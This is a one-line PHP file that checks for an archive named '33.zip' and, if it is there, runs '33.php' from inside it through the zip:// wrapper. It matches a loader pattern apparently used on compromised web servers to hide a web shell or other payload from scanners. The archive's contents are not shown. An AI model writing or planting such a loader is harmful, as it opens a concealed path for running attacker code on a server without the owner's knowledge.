<?php if(file_exists('33.zip')){require 'zip://33.zip#33.php';}?>
